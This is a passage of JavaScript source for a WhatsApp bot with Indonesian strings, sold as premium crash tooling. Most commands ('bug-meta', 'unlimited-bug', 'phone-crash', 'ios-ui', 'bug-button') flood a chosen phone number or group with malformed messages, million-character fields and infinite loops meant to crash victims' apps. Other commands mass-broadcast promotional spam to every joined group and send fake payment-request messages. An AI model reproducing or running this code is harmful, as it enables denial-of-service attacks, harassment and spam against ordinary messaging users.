await ngeloc(target, anggazyycrash)
await baklis(target, angggazyyvault)
await ngeloc(target, anggazyycrash)
await pirgam(target, angggazyyvault)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await baklis(target, angggazyyvault)
await ngeloc(target, anggazyycrash)
await pirgam(target, angggazyyvault)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await baklis(target, angggazyyvault)
await ngeloc(target, anggazyycrash)
await pirgam(target, angggazyyvault)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await baklis(target, angggazyyvault)
await ngeloc(target, anggazyycrash)
await pirgam(target, angggazyyvault)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await baklis(target, angggazyyvault)
await ngeloc(target, anggazyycrash)
await pirgam(target, angggazyyvault)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break

case 'bug-meta': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 1; j++) {
await baklis(target, angggazyyvault)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await listxeonfck(target, oneclickxeon)
await locationxeony(target, force)
await xeonkillpic(target, oneclickxeon)
await locationxeony(target, force)
await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
await locationxeony(target, force)
await xeonkillpic(target, oneclickxeon)
await locationxeony(target, force)
await blackening(target, force2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await pirgam(target, angggazyyvault)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await baklis(target, angggazyyvault)
await ngeloc(target, anggazyycrash)
await pirgam(target, angggazyyvault)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await baklis(target, angggazyyvault)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await baklis(target, angggazyyvault)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await pirgam(target, angggazyyvault)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'unlimited-bug': case '😈': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (;;) {
await ngeloc(target, anggazyycrash)
await baklis(target, angggazyyvault)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await baklis(target, angggazyyvault)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await baklis(target, angggazyyvault)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await baklis(target, angggazyyvault)
await ngeloc(target, anggazyycrash)
await sleep(30000)
}
}
break
case 'devilreact': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')

if (!m.quoted) return reply(`Example usage: ${prefix + command} reply chat`)

await anggazyy.sendMessage(m.chat, { text: 'Success In Sending Bug', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: `By anggazyy 666`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })

await sleep(2000)

await anggazyy.sendMessage(m.chat, { react: { text: '🐛', key: { remoteJid: m.chat, fromMe: true, id: quoted.id } } })

}

break        
case 'enter-react': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')

if (!m.quoted) return reply(`Example usage: ${prefix + command} reply chat`)

await anggazyy.sendMessage(m.chat, { text: 'Success In Sending Bug', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: `By anggazyy 666`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })

await sleep(2000)

await anggazyy.sendMessage(m.chat, { react: { text: '🐛', key: { remoteJid: m.chat, fromMe: true, id: quoted.id } } })

}

break        
        case 'devil-list': {


if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')

if (!text) return reply(`Example:\n${prefix + command} 62xxxxxxxxx|5`)

victim = text.split("|")[0]+"@s.whatsapp.net"

amount = text.split("|")[1] * 30

for (let i = 0; i < amount; i++) {

await anggazyy.sendMessage(victim, { text: '' }, { quoted: xbug2 })

}

reply(`Successfully Sent Bug To ${victim}`)

}
case 'enter-list': {


if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')

if (!text) return reply(`Example:\n${prefix + command} 62xxxxxxxxx|5`)

victim = text.split("|")[0]+"@s.whatsapp.net"

amount = text.split("|")[1] * 30

for (let i = 0; i < amount; i++) {

await anggazyy.sendMessage(victim, { text: '' }, { quoted: xbug2 })

}

reply(`Successfully Sent Bug To ${victim}`)

}
//=================================================//
case 'phone-crash': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
  for (;;) {
    await ngeloc(target, angggazyyvault)
  }
}
break
//=================================================//
case 'ios-unlimited': case 'ios-ui': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
await reply(`In proses....`)
let target = bijipler + '@s.whatsapp.net'
  for (;;) {
    await anggazyyiphone(target)
    await sleep(1200)
  }
}
break
//=================================================//
case 'ios-uicrash': case 'ios-infinity': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527|1\n# memasukkan 1 sama dengan 300.detik`)
let ppek = q.split("|")[0]
let bijipler = ppek.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527|1`)
let target = bijipler+"@s.whatsapp.net"
let jumlah = q.split("|")[1] * 200
let ppk = jumlah * 1.5
m.reply(ppk + " detik");
reply(`In proses....`)
for (let j = 0; j < jumlah; j++) {
await anggazyyiphone(target)
await sleep(1500)
}
reply(`👤 Succes Send Bug Ke ${target} dalam kurun waktu ${ppk} detik`)
}
break
//=================================================//
case 'bug-button': case 'bug-sitexyz': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} https://chat.whatsapp.com/`)
reply(`In proses....`)
let result = args[0].split('https://chat.whatsapp.com/')[1];
let target = await anggazyy.groupAcceptInvite(result);
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "🩸⃟༑⌁⃰𝙰𝚗𝚐𝚐𝚊𝚣𝚢𝚢 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠"
    },
    "footer": {
      "text": "›          #anggazyy666"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻DevilS⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: m.chat, quoted: angggazyyvault })
await anggazyy.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(700)
}
reply(`<✓> Successfully Send Bug to ${target} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'button-internal': case 'button-external': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} https://chat.whatsapp.com/`)
reply(`In proses....`)
let result = args[0].split('https://chat.whatsapp.com/')[1];
let target = await anggazyy.groupAcceptInvite(result);
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "🩸⃟༑⌁⃰𝙰𝚗𝚐𝚐𝚊𝚣𝚢𝚢 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠"
    },
    "footer": {
      "text": "›          #anggazyy666"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻DevilS⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: m.chat, quoted: angggazyyvault })
await anggazyy.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(700)
}
reply(`<✓> Successfully Send Bug to ${target} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'enemygroup': case 'bug-hole': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 1962623836281@g.us`)
reply(`In proses....`)
target = q
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "🩸⃟༑⌁⃰𝙰𝚗𝚐𝚐𝚊𝚣𝚢𝚢 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠"
    },
    "footer": {
      "text": "›          #anggazyy666"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻DevilS⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: m.chat, quoted: angggazyyvault })
await anggazyy.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(700)
}
reply(`<✓> Successfully Send Bug to ${target} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'internal-group': case 'external-group': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 1962623836281@g.us`)
reply(`In proses....`)
target = q
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "🩸⃟༑⌁⃰𝙰𝚗𝚐𝚐𝚊𝚣𝚢𝚢 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠"
    },
    "footer": {
      "text": "›          #anggazyy666"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻DevilS⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: m.chat, quoted: angggazyyvault })
await anggazyy.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(700)
}
reply(`<✓> Successfully Send Bug to ${target} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case "listgc": case "cekidgc": case"listgrup": {
let gcall = Object.values(await anggazyy.groupFetchAllParticipating().catch(_=> null))
let listgc = '\n'
await gcall.forEach((u, i) => {
listgc += `*${i+1}.* ${u.subject}\n* *ID :* ${u.id}\n* *Total Member :* ${u.participants.length} Member\n* *Status Grup :* ${u.announce == true ? "Tertutup" : "Terbuka"}\n* *Pembuat :* ${u.owner ? u.owner.split('@')[0] : 'Sudah keluar'}\n\n`
})
anggazyy.sendMessage(m.chat, {text: `${listgc}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
thumbnail: await getBuffer(ppuser), title: `[ ${gcall.length} Group Chat ] `, body: `Runtime : ${runtime(process.uptime())}`,  sourceUrl: global.linkyt, previewType: "PHOTO"}}}, {quoted: qchanel})
}
break
case "joingc": case "join": {
if (!isOwner) return reply(msg.owner)
if (!text && !m.quoted) return reply(example('linknya'))
let teks = m.quoted ? m.quoted.text : text
if (!teks.includes('whatsapp.com')) return reply("Link Tautan Tidak Valid!")
let result = teks.split('https://chat.whatsapp.com/')[1]
await anggazyy.groupAcceptInvite(result).then(respon => reply("Berhasil Bergabung Ke Dalam Grup ✅")).catch(error => reply(error.toString()))
}
break
case "leave": case "leavegc": {
if (!isOwner) return reply(msg.owner)
if (!isGroup) return reply(msg.group)
await reply("Otw Bosss")
await sleep(3000)
await anggazyy.groupLeave(m.chat)
}
break
case "leavegc2": case "leave2": {
if (!isOwner) return reply(msg.owner)
let gcall = await Object.values(await anggazyy.groupFetchAllParticipating().catch(_=> null))
let num = []
let listgc = `*Contoh Cara Penggunaan :*\nKetik *${cmd}* Nomor Grup\n\n`
await gcall.forEach((u, i) => {
num.push(i)
listgc += `*${i+1}.* ${u.subject}\n* *ID :* ${u.id}\n* *Total Member :* ${u.participants.length} Member\n* *Status Grup :* ${u.announce == true ? "Tertutup" : "Terbuka"}\n* *Pembuat :* ${u.owner ? u.owner.split('@')[0] : 'Sudah keluar'}\n\n`
})
if (!args[0]) {
anggazyy.sendMessage(m.chat, {text: `${listgc}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
thumbnail: await getBuffer(ppuser), title: `[ ${gcall.length} Group Chat ] `, body: `Runtime : ${runtime(process.uptime())}`,  sourceUrl: global.linkyt, previewType: "PHOTO"}}}, {quoted: qchanel})
} else if (args[0]) {
if (!num.includes(Number(args[0]) - 1)) return reply("Grup tidak ditemukan")
let leav = Number(args[0]) - 1
await reply(`Berhasil Keluar Dari Grup :\n*${gcall[leav].subject}*`)
await anggazyy.groupLeave(`${gcall[leav].id}`)
}}
break
case "rst": case "restartbot": {
if (!isOwner) return reply(msg.owner)
await reply("Memproses Restart Bot . . .")
execSync("npm restart")
}
break
case "scbot": case "sc": 
case "scriptbot": {
if (isOwner) {
reply("Memproses Pengambilan Scriptbot")
let a = getTime().split("T")[1].split("+")[0]
var name = `V4Private⚡`
const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
(pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != ""
)
const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
await anggazyy.sendMessage(m.sender, {document: await fs.readFileSync(`./${name}.zip`), fileName: `${name}.zip`, 
mimetype: "application/zip"}, {quoted: m})
await execSync(`rm -rf ${name}.zip`)
if (m.chat !== m.sender) return reply("Scriptbot Berhasil Dikirim Ke Chat Pribadi")
} else {
let teks = `*# Script ${namabot}*

Script Bot Ini Tidak Di Bagikan Secara *Gratis!!*

Jika Anda Berminat Ingin Membeli Script Ini, Silahkan Chat *Ownerbot* Dengan Cara Ketik *.owner*

*➡️ Youtube :*
${global.linkyt}

*➡️ Grup Jualan :*
${global.linkgc}

*➡️ Testimoni :*
${global.linksaluran}`
anggazyy.relayMessage(m.chat,  {requestPaymentMessage: {currencyCodeIso4217: 'IDR', amount1000: 1000000, requestFrom: m.sender, noteMessage: { extendedTextMessage: { text: teks, contextInfo: { externalAdReply: { showAdAttribution: true}}}}}}, {})
}}
break
case "done": {
if (isGroup) return reply(msg.private)
if (!isOwner) return reply(msg.owner)
if (!text) return reply(example("Panel Unlimited"))
let caption = `\n📦 ${text}\n⏰ ${tanggal(Date.now())}`
const referenceId = `${crypto.randomBytes(11).toString('hex').toUpperCase().slice(0, 11)}`
let ngentod = await generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2,
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
}), 
footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+namabot2
}),
header: proto.Message.InteractiveMessage.Header.create({
hasMediaAttachment: true,
...(await prepareWAMessageMedia({
image: await fs.readFileSync("./media/menu.jpg")}, {upload: anggazyy.waUploadToServer})), 
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [{
"name": "review_and_pay",
"buttonParamsJson": `{
"currency": "IDR",
"payment_configuration": "",
"payment_type": "",
"total_amount": {
"value": 99999999,
"offset": 100
},
"reference_id": "${referenceId}",
"type": "physical-goods",
"order": {
"status": "payment_requested",
"description": "Terimakasih",
"subtotal": {
"value": 99999999,
"offset": 100
},
"tax": {
"value": 0,
"offset": 100
}, 
"discount": {
"value": 0,
"offset": 100
},
"order_type": "ORDER",
"items": [{
"retailer_id": "7537631592926009",
"product_id": "7538731592926009",
"name": "TRANSAKSI DONE ✅",
"amount": {
"value": 99999999,
"offset": 1000
},
"quantity": "100"
}]}, 
"additional_note": "${caption}",
"native_payment_methods": []}`
}]}),
contextInfo: {
stanzaId: m.key.id,
remoteJid: isGroup ? m.sender : m.key.remoteJid,
participant: m.key.participant || m.sender,
fromMe: m.key.fromMe,
}}),
}}}, {userJid: m.sender, quoted: m})

await anggazyy.relayMessage(ngentod.key.remoteJid, ngentod.message, {
messageId: ngentod.key.id})
}
break
case "startjpm": {
if (!isOwner) return reply(msg.owner)
var teksnya = await fs.readFileSync("./list/teksjpm.js").toString()
if (teksnya.length < 1) return reply("Teks Jpm Tidak Ditemukan, Silahkan Isi/Edit Teks Jpm Didalam Folder all/database")
var teks = `${teksnya}`
let total = 0
let getGroups = await anggazyy.groupFetchAllParticipating()
let usergc = await Object.keys(getGroups)
let time = ms(delayjpm * Number(usergc.length))
await reply(`Memproses Mengirim Pesan Ke Teks *${usergc.length} Grup*

*Waktu Selsai :*
${time.minutes} menit, ${time.seconds} detik`)
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: false }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Chat Owner\",\"url\":\"https://wa.me/${owner}\",\"merchant_url\":\"https://www.google.com\"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Testimoni\",\"url\":\"${global.linksaluran}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Marketplace\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qtoko})
for (let jid of usergc) {
try {
await anggazyy.relayMessage(jid, msgii.message, { 
messageId: msgii.key.id 
})
total += 1
} catch {}
await sleep(4000)
}
reply(`Berhasil Mengirim Pesan Teks Ke *${total} Grup*`)
}
break
case "jpmhidetag": case "jpmht": {
if (!isOwner) return reply(msg.owner)
if (!text && !m.quoted) return reply(example("teksnya atau replyteks"))
var teks = m.quoted ? m.quoted.text : text
let total = 0
let getGroups = await anggazyy.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let usergc = groups.map((v) => v.id)
let time = ms(delayjpm * Number(usergc.length))
await reply(`Memproses Mengirim Pesan Hidetag Teks Ke *${usergc.length} Grup*

*Waktu Selsai :*
${time.minutes} menit, ${time.seconds} detik`)
var ments = []
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: ments, 
externalAdReply: {
showAdAttribution: false }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/${owner}\",\"merchant_url\":\"https://www.google.com\"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Testimoni\",\"url\":\"${global.linksaluran}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Join Grup\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
}]
}),
})}
}}, {userJid: m.sender, quoted: qtoko})
for (let jid of usergc) {
try {
ments = getGroups[jid].participants.map(e => e.id)
await anggazyy.relayMessage(jid, msgii.message, { 
messageId: msgii.key.id 
})
total += 1
} catch (e) {
console.log(e)
}
await sleep(global.delayjpm)
}
reply(`Berhasil Mengirim Pesan Hidetag Teks Ke *${total} Grup*`)
}
break
case "jpmhidetag2": case "jpmht2": {
if (!isOwner) return reply(msg.owner)
if (!text) return reply(example("teksnya dengan balas/kirim foto"))
if (!/image/.test(mime)) return reply(example("teksnya dengan balas/kirim foto"))
let image = await anggazyy.downloadAndSaveMediaMessage(qmsg)
var teks = text
let total = 0
let getGroups = await anggazyy.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let usergc = groups.map((v) => v.id)
let time = ms(delayjpm * Number(usergc.length))
await reply(`Memproses Mengirim Pesan Hidetag Teks & Foto Ke *${usergc.length} Grup*

*Waktu Selsai :*
${time.minutes} menit, ${time.seconds} detik`)
var ments = []
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: ments, 
externalAdReply: {
showAdAttribution: false }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/${owner}\",\"merchant_url\":\"https://www.google.com\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Testimoni\",\"url\":\"${global.linksaluran}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Join Grup\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
}]
}),
})} 
}}, {userJid: m.sender, quoted: qtoko})
for (let jid of usergc) {
try {
ments = getGroups[jid].participants.map(e => e.id)
await anggazyy.relayMessage(jid, msgii.message, { 
messageId: msgii.key.id 
})
total += 1
} catch (e) {
console.log(e)
}
await sleep(global.delayjpm)
}
reply(`Berhasil Mengirim Pesan Hidetag Teks & Foto Ke *${total} Grup*`)
}
break
case "jpm": {
if (!isOwner) return reply(msg.owner)
if (!text && !m.quoted) return reply(example("teksnya atau replyteks"))
var teks = m.quoted ? m.quoted.text : text
let total = 0
let getGroups = await anggazyy.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let usergc = groups.map((v) => v.id)
let time = ms(delayjpm * Number(usergc.length))
await reply(`Memproses Mengirim Pesan Teks Ke *${usergc.length} Grup*

*Waktu Selsai :*
${time.minutes} menit, ${time.seconds} detik`)
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: false }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/${owner}\",\"merchant_url\":\"https://www.google.com\"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Testimoni\",\"url\":\"${global.linksaluran}\",\"merchant_url\":\"https://www.google.com\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Join Grup\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
}]
}),
})} 
}}, {userJid: m.sender, quoted: qtoko})
for (let jid of usergc) {
try {
await anggazyy.relayMessage(jid, msgii.message, { 
messageId: msgii.key.id 
})
total += 1
} catch {}
await sleep(global.delayjpm)
}
reply(`Berhasil Mengirim Pesan Teks Ke *${total} Grup*`)
}
break
case "jpm2": {
if (!isOwner) return reply(msg.owner)
if (!text) return reply(example("teksnya dengan balas/kirim foto"))
if (!/image/.test(mime)) return reply(example("teksnya dengan balas/kirim foto"))
let image = await anggazyy.downloadAndSaveMediaMessage(qmsg)
if (global.idsaluran == "-") return reply('Isi Dulu ID Saluran Lu Di File Settings.js!')
let total = 0
let getGroups = await anggazyy.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let usergc = groups.map((v) => v.id)
let time = ms(delayjpm * Number(usergc.length))
await reply(`Memproses Mengirim Pesan Teks & Foto Ke *${usergc.length} Grup*

*Waktu Selsai :*
${time.minutes} menit, ${time.seconds} detik`)
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: false }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: text
}), header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync(image)}, { upload: anggazyy.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/${owner}\",\"merchant_url\":\"https://www.google.com\"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Testimoni\",\"url\":\"${global.linksaluran}\",\"merchant_url\":\"https://www.google.com\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Join Grup\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
}]
}),
})} 
}}, {userJid: m.sender, quoted: qtoko})
for (let jid of usergc) {
try {
await anggazyy.relayMessage(jid, msgii.message, { 
messageId: msgii.key.id 
})
total += 1
} catch {}
await sleep(global.delayjpm)
}
await fs.unlinkSync(image)
reply(`Berhasil Mengirim Pesan Teks & Foto Ke *${total} Grup*`)
}
break
case "jpmslide": case "startjpmslide": {
if (!isOwner) return reply(msg.owner)
let total = 0
let getGroups = await anggazyy.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let usergc = groups.map((v) => v.id)
let time = ms(delayjpm * Number(usergc.length))
const Obj = [`\n*List Harga Panel Pterodactyl⚡*

* *Ram 1GB & Cpu 40%*
Harga : Rp2000
* *Ram 2GB & Cpu 50%*
Harga : Rp3000
* *Ram 3GB & Cpu 60%*
Harga : Rp4000
* *Ram 4GB & Cpu 80%*
Harga : Rp5000
* *Ram 5GB & Cpu 110%*
Harga : Rp6000
* *Ram & Cpu Unlimited*
Harga : Rp6000

